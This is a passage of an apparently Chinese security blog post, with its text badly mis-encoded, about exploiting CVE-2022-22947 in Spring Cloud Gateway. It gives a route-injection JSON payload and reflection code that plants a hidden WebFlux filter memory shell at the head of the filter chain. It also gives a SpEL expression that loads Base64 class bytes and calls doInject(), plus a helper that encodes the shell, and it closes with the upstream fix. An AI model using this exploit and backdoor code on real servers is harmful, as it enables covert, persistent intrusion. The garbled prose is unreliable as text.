title="å›æ˜¾"></a>å›æ˜¾</h3><p>ç”¨æˆ·å®šä¹‰çš„è·¯ç”±ä¿¡æ¯ä¼šå­˜åœ¨å†…å­˜ä¸­ï¼Œrefreshåä¼šæŠŠç»“æœå†™å…¥è·¯ç”±ä¿¡æ¯ã€‚é€šè¿‡è·¯ç”±ä¿¡æ¯çš„APIçœ‹åˆ°RCEçš„ç»“æœï¼ˆå°±ä¸Šé¢payloadæ³¨å†Œå®Œè·¯ç”±åGETè®¿é—®è·¯ç”±è·¯å¾„ï¼‰</p><ul><li>åˆ©ç”¨RedirectTOè¿‡æ»¤å™¨æ³¨å…¥ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;first_route&quot;</span>,</span><br><span class="line">    <span class="string">&quot;predicates&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;filters&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RedirectTo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;args&quot;</span>: </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;status&quot;</span>: <span class="string">&quot;302&quot;</span>,</span><br><span class="line">                <span class="string">&quot;url&quot;</span>: <span class="string">&quot;payload&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;https://www.uri-destination.org&quot;</span>,</span><br><span class="line">    <span class="string">&quot;order&quot;</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨springå®˜æ–¹æ–‡æ¡£å¯ä»¥çœ‹åˆ°RedirectToæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªstatusä¸€ä¸ªurlï¼Œä½†æ˜¯ä¼šéªŒè¯å‚æ•°ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´statuså°±å¿…é¡»æ˜¯æšä¸¾ç±»å‹ï¼Œurlå°±ä¼šè¿›è¡Œurlè§£æï¼Œæ‰€ä»¥è¯¥è¿‡æ»¤å™¨ä¸èƒ½ä½¿ç”¨ï¼Œæ²¡æœ‰ä¼ å…¥å­—ç¬¦ä¸²ç±»å‹çš„å‚æ•°ï¼Œå¦‚RemoveRequestHeaderï¼ŒåŒç†å¯¹predicatesé“¾</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230329213923525.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230329213923525.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="æ³¨å…¥å†…å­˜é©¬"><a href="#æ³¨å…¥å†…å­˜é©¬" class="headerlink" title="æ³¨å…¥å†…å­˜é©¬"></a>æ³¨å…¥å†…å­˜é©¬</h2><p>spring cloud gatewayæ˜¯åŸºäºWebFluxçš„ï¼Œå…³äºWebFluxï¼Œè¿™ç¯‡æ–‡ç« æœ‰è¯¦å°½çš„è¯´æ˜ï¼š</p><p><a href="https://juejin.cn/post/7001032584821997598">https://juejin.cn/post/7001032584821997598</a></p><p>webæœåŠ¡åŸºäºnettyå’Œspringï¼Œc0ny1ä½¬å¯¹é’ˆå¯¹nettyå’Œspringæ„é€ äº†å†…å­˜é©¬</p><h3 id="nettyå†…å­˜é©¬"><a href="#nettyå†…å­˜é©¬" class="headerlink" title="nettyå†…å­˜é©¬"></a>nettyå†…å­˜é©¬</h3><p>nettyå¤„ç†httpè¯·æ±‚ä¼šç”¨pipelineé“¾ä¸Šçš„handlerä¾æ¬¡æ¥å¤„ç†ï¼Œå†…å­˜é©¬å°±æ˜¯æ¨¡æ‹Ÿæ³¨å†Œä¸€ä¸ªhandlerã€‚ä½†æ˜¯nettyæ˜¯åŠ¨æ€æ„é€ pipelineã€‚</p><p>åŠ¨æ€æ·»åŠ handlerçš„CompositeChannelPipelineConfigurerçš„compositeChannelPipelineConfigurerç¬¬äºŒä¸ªå‚æ•°otheré»˜è®¤ä¸ºç©ºï¼Œå³é»˜è®¤ç¬¬ä¸€ä¸ªã€‚å¦‚æœç¬¬äºŒä¸ªå‚æ•°otheræœ‰å€¼ï¼Œå°†è¢«åˆå¹¶ä¸ºä¸€ä¸ªæ–°Configurer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330095907105.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330095907105.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330095949904.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330095949904.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½¿ç”¨reactor.netty.transport.TransportConfig#doOnchannelInitæ¥è·å–Configurer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330100251980.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330100251980.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è‡³äºæ„é€ nettyå†…å­˜é©¬çš„ä»£ç ï¼Œå·²ç»æ¥åˆ°äº†çŸ¥è¯†ç›²åŒºï¼Œç›´æ¥ç§»æ­¥<a href="https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg">https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg</a></p><h3 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h3><p>åˆ†æä¸€émieeaä½¬çš„webFilterå†…å­˜é©¬</p><p>spring Webfluxæ˜¯æœ‰filterçš„ï¼Œåœ¨å®˜æ–¹æ–‡æ¡£é‡Œæœ‰ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330222501934.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330222501934.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330222403239.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330222403239.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬çŸ¥é“filterä¸€èˆ¬éƒ½æ˜¯ä¸€ä¸ªé“¾ï¼Œåœ¨è¿™é‡Œæ˜¯ç”¨DefaultWebFilterChain</p><p>åœ¨<code>DefaultWebFilterChain#invokefilter()</code>å¤„è§¦å‘filter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330223055686.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330223055686.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯ä»¥çœ‹åˆ°filter()å‚æ•°åªæœ‰ServerWebExchangeï¼Œé‚£æ¨¡æ‹Ÿå°±returnè°ƒç”¨ä¸‹ä¸€ä¸ªfilteræ„æˆfilteré“¾</p><p>ä¸€ä¸ªFilter Demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.core.annotation.Order;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Order(value = 2)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NormalFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, WebFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åå°„åˆ©ç”¨DefaultWebFilterChain#initChain()æ¨¡æ‹Ÿæ³¨å†Œä¸€ä¸ªfilter:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330225056456.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330225056456.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯¥Chainç”±FilteringWebHandlerç”Ÿæˆå®ä¾‹ï¼Œç›´æ¥new FilteringWebHandlerå°±èƒ½å°†Filteræ’å…¥åˆ°é¦–ä½</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330225422742.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230330225422742.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="pocæ„é€ ï¼š"><a href="#pocæ„é€ ï¼š" class="headerlink" title="pocæ„é€ ï¼š"></a>pocæ„é€ ï¼š</h4><p>è°ƒè¯•ç¯å¢ƒï¼š<a href="https://github.com/Ha0Liu/CVE-2022-22947">https://github.com/Ha0Liu/CVE-2022-22947</a></p><p>ä½¿ç”¨c0ny1å¸ˆå‚…çš„java-Object-searcherå·¥å…·ï¼ˆ<a href="https://github.com/c0ny1/java-object-searcher%EF%BC%89%E6%89%BE%E5%88%B0%E5%86%85%E5%AD%98%E4%B8%ADDefaultWebFilterChain%E7%9A%84%E4%BD%8D%E7%BD%AE">https://github.com/c0ny1/java-object-searcherï¼‰æ‰¾åˆ°å†…å­˜ä¸­DefaultWebFilterChainçš„ä½ç½®</a></p><p>æ–°å»ºä¸€ä¸ªNormalFilterï¼ŒæŠŠç¼–è¯‘å¥½çš„java-obejct-searcher-0.1.0.jarå¯¼å…¥åˆ°targetç›®å½•ä¸‹ï¼Œé¡¹ç›®å¯åŠ¨åè§¦å‘ä¸€éfilter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.annotation.Order;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Order(value = 2)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NormalFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, WebFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="comment">//è®¾ç½®æœç´¢ç±»å‹åŒ…å«Requestå…³é”®å­—çš„å¯¹è±¡</span></span><br><span class="line">        List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;chain&quot;</span>).build());</span><br><span class="line">        List&lt;Blacklist&gt; blacklists = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        blacklists.add(<span class="keyword">new</span> <span class="title class_">Blacklist</span>.Builder().setField_type(<span class="string">&quot;java.io.File&quot;</span>).build());</span><br><span class="line">        <span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);</span><br><span class="line">        searcher.setBlacklists(blacklists);</span><br><span class="line">        searcher.setIs_debug(<span class="literal">true</span>);</span><br><span class="line">        searcher.setMax_search_depth(<span class="number">10</span>);</span><br><span class="line">        searcher.setReport_save_path(<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">        searcher.searchObject();</span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403105648279.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403105648279.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>äºæ˜¯æˆ‘ä»¬å¾—åˆ°å†…å­˜é©¬æ„é€ çš„æµç¨‹ï¼š</p><ol><li>æ„é€ æ¶æ„filter</li></ol><p>å“¥æ–¯æ‹‰é‡Œé¢ç”Ÿæˆjspçš„é©¬</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403150154035.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403150154035.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>filterä¸èƒ½å½±å“æ­£å¸¸çš„ä¸šåŠ¡ï¼ŒåŠ ä¸€ä¸ªèº«ä»½éªŒè¯çš„httpå¤´ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">authorizationHeader</span> <span class="operator">=</span> exchange.getRequest().getHeaders().getFirst(HttpHeaders.AUTHORIZATION);</span><br><span class="line"><span class="keyword">if</span>(authorizationHeader != <span class="literal">null</span> &amp;&amp; authorizationHeader.equals(auth)) &#123;......&#125;</span><br></pre></td></tr></table></figure><p>è¡¨å•æ•°æ®ç”¨<code>ServerWebexchange.getFormData()</code>è·å–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mono&lt;MultiValueMap&lt;String, String&gt;&gt; formData = exchange.getFormData();</span><br></pre></td></tr></table></figure><p>è·å–åˆ°çš„æ•°æ®æ˜¯é”®å€¼å¯¹æ•°æ®æµï¼Œç”¨flatMapå¯¹æ•°æ®æµè¿›è¡Œåˆå¹¶åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">Mono</span> <span class="variable">bufferStream</span> <span class="operator">=</span> formData.flatMap(map -&gt; &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">passStr</span> <span class="operator">=</span> map.getFirst(pass);</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">     ......</span><br><span class="line"> <span class="keyword">return</span> Mono.just(<span class="keyword">new</span> <span class="title class_">DefaultDataBufferFactory</span>().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ä¸ºæ–¹ä¾¿ç§»æ¤ï¼ŒæŠŠå“¥æ–¯æ‹‰çš„sessionæ¢æˆ<code>Map&lt;String,Object&gt;</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; store = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br></pre></td></tr></table></figure><ol start="2"><li>ä»çº¿ç¨‹ä¸­è·å–åˆ°DefaultWebFilterChain:</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getThreads = Thread.class.getDeclaredMethod(<span class="string">&quot;getThreads&quot;</span>);</span><br><span class="line">        getThreads.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">threads</span> <span class="operator">=</span> getThreads.invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Array.getLength(threads); i++) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">thread</span> <span class="operator">=</span> Array.get(threads, i);</span><br><span class="line">            <span class="keyword">if</span> (thread != <span class="literal">null</span> &amp;&amp; thread.getClass().getName().contains(<span class="string">&quot;NettyWebServer&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// è·å–defaultWebFilterChain</span></span><br><span class="line">                <span class="type">NettyWebServer</span> <span class="variable">nettyWebServer</span> <span class="operator">=</span> (NettyWebServer) getFieldValue(thread, <span class="string">&quot;this$0&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                <span class="type">ReactorHttpHandlerAdapter</span> <span class="variable">reactorHttpHandlerAdapter</span> <span class="operator">=</span> (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, <span class="string">&quot;handler&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">delayedInitializationHttpHandler</span> <span class="operator">=</span> getFieldValue(reactorHttpHandlerAdapter,<span class="string">&quot;httpHandler&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                HttpWebHandlerAdapter httpWebHandlerAdapter= (HttpWebHandlerAdapter)getFieldValue(delayedInitializationHttpHandler,<span class="string">&quot;delegate&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                ExceptionHandlingWebHandler exceptionHandlingWebHandler= (ExceptionHandlingWebHandler)getFieldValue(httpWebHandlerAdapter,<span class="string">&quot;delegate&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">                <span class="type">FilteringWebHandler</span> <span class="variable">filteringWebHandler</span> <span class="operator">=</span> (FilteringWebHandler)getFieldValue(exceptionHandlingWebHandler,<span class="string">&quot;delegate&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">                DefaultWebFilterChain defaultWebFilterChain= (DefaultWebFilterChain)getFieldValue(filteringWebHandler,<span class="string">&quot;chain&quot;</span>,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><ol start="3"><li>å°†æ¶æ„filteræ’å…¥åˆ°Chainä¸­ï¼Œå¹¶æŒ‡å®šåˆ°é¦–ä½(0ä½)</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;WebFilter&gt; newAllFilters= <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(defaultWebFilterChain.getFilters());</span><br><span class="line">newAllFilters.add(<span class="number">0</span>,<span class="keyword">new</span> <span class="title class_">FilterMemshellPro</span>());</span><br><span class="line"><span class="type">DefaultWebFilterChain</span> <span class="variable">newChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebFilterChain</span>((WebHandler) handler, newAllFilters);</span><br></pre></td></tr></table></figure><p>ç”ŸæˆfilteringWebHandler:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> filteringWebHandler.getClass().getDeclaredField(<span class="string">&quot;chain&quot;</span>);</span><br><span class="line">....</span><br><span class="line">f.set(filteringWebHandler,newChain);</span><br></pre></td></tr></table></figure><p>ç›´è¾¾githubå®Œæ•´pocï¼š<a href="https://github.com/mieeA/SpringWebflux-MemShell/">https://github.com/mieeA/SpringWebflux-MemShell/</a></p><h4 id="spelè¡¨è¾¾å¼æ³¨å…¥å­—èŠ‚ç "><a href="#spelè¡¨è¾¾å¼æ³¨å…¥å­—èŠ‚ç " class="headerlink" title="spelè¡¨è¾¾å¼æ³¨å…¥å­—èŠ‚ç "></a>spelè¡¨è¾¾å¼æ³¨å…¥å­—èŠ‚ç </h4><p>Memshellæ”¹ä¸ºä½ çš„è½¯ä»¶åŒ…å+shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="string">&#x27;Memshell&#x27;</span>,T(org.springframework.util.Base64Utils).decodeFromString(<span class="string">&#x27;yv66vgAAA....&#x27;</span>),<span class="keyword">new</span> <span class="title class_">javax</span>.management.loading.MLet(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[<span class="number">0</span>],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å…¶ä¸­<code>&#39;yv66vgAAA....&#39;</code>ä¸ºBase64Encodeçš„å­—èŠ‚ç ï¼Œå¯é€šè¿‡å¦‚ä¸‹ä»£ç ç”Ÿæˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.Base64Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncodeShell</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;MemShell.class&quot;</span>);</span><br><span class="line">            data = <span class="keyword">new</span> <span class="title class_">byte</span>[in.available()];</span><br><span class="line">            in.read(data);</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">shellStr</span> <span class="operator">=</span> Base64Utils.encodeToString(data);</span><br><span class="line">        System.out.println(shellStr);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ShellStr.txt&quot;</span>);</span><br><span class="line">            out.write(shellStr.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403160101623.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403160101623.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403210809225.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403210809225.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403211324940.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403211324940.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403211438387.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230403211438387.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœæ³¨å…¥è¿‡ç¨‹æœ‰é—®é¢˜ï¼Œå¯ä»¥åœ¨dockerä¸­çœ‹ä¸‹Log</p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><a href="https://github.com/spring-cloud/spring-cloud-gateway/commit/d8c255eddf4eb5f80ba027329227b0d9e2cd9698">https://github.com/spring-cloud/spring-cloud-gateway/commit/d8c255eddf4eb5f80ba027329227b0d9e2cd9698</a></p><p>commitçš„å†å²ä¸­ï¼ŒæŠŠStandardEvaluationContextæ›¿æ¢ä¸ºäº†SimpleEvalutionContext</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328182426298.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328182426298.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/ExpLang/article/details/121670490?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167927922816800192224617%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167927922816800192224617&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-121670490-null-null.142%5Ev74%5Econtrol,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187"></a></p><p><a href="https://www.cnblogs.com/N0r4h/p/15986151.html"></a></p><p><a 